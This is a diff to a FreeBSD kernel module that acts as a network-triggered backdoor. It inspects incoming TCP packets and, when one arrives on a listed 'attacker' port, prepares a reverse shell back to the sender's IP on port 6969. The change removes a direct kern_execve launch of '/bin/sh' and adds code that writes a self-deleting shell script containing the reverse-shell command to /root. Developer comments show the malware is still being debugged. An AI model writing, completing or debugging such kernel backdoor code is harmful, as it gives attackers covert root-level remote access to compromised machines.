@@ -19,7 +19,7 @@
 #include <net/if.h>
 
 
-// understand this!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+// replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
 
 
@@ -56,7 +56,10 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
     struct ip *ip_header;
     struct tcphdr *tcp_header;
     int i;
-
+    struct file *fp;
+    struct vnode *vp;
+    struct nameidata nd;
+    int error;
 
     // Ensure mbuf is valid
     if (m == NULL) return PFIL_PASS;;
@@ -70,6 +73,7 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
    
     // Extract the IP header
     ip_header = mtod(m, struct ip *);
+
     // Check if it's a TCP packet
     if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
 
@@ -92,6 +96,15 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
         // Check if the destination port is in the list
         for (i = 0; i < sizeof(attacker_ports) / sizeof(int); i++) {
             if (ntohs(tcp_header->th_dport) == attacker_ports[i]) {
+
+
+
+                // this is where we are having issues!!
+                // this is where we are having issues!!
+                // this is where we are having issues!!
+                // this is where we are having issues!!
+
+
 
 
                 // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
@@ -120,25 +133,46 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
 
                 printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
                
-                struct thread *td = curthread;
-                struct execve_args args;
-                char *path = "/bin/sh";
-                char *argv[] = {"/bin/sh", "-c", reverse_shell_cmd, NULL};
-                char *envv[] = {NULL};
 
 
-                // Set up execve_args properly
-                args.fname = path;
-                args.argv = argv;
-                args.envv = envv;
+
                
-                kern_execve(td, &args);
+                  // File path to create
+                char *filepath = "/root/lkm_trigger.sh";
+
+                // Initialize nameidata for file creation
+                NDINIT(&nd, LOOKUP, NOFOLLOW, UIO_SYSSPACE, filepath, curthread);
+                error = vn_open(&nd, O_CREAT | O_WRONLY, 0600);
+                if (error) {
+                    printf("[LKM] Failed to create file %s\n", filepath);
+                    return PFIL_PASS;
+                }
+
+                vp = nd.ni_vp;
+                VOP_UNLOCK(vp, 0);
+
+                // Write contents to file
+                char file_content[200];
+                snprintf(file_content, sizeof(file_content),
+                    "#!/bin/sh\n%s\nrm -- \"$0\"\n", reverse_shell_cmd);
+
+                error = vn_rdwr(UIO_WRITE, vp, file_content, strlen(file_content),
+                    0, UIO_SYSSPACE, IO_NODELOCKED | IO_UNIT, curthread->td_ucred, NOCRED, NULL);
+                
+                if (error) {
+                    printf("[LKM] Failed to write to file %s\n", filepath);
+                }
+
+                // Close file
+                vn_close(vp, FWRITE, curthread->td_ucred, curthread);
+                
+                printf("[LKM] File %s created successfully\n", filepath);
                 break; // Stop after the first match
             }
         }
     }
    
-    return PFIL_PASS;;
+    return PFIL_PASS;
 }
 
 
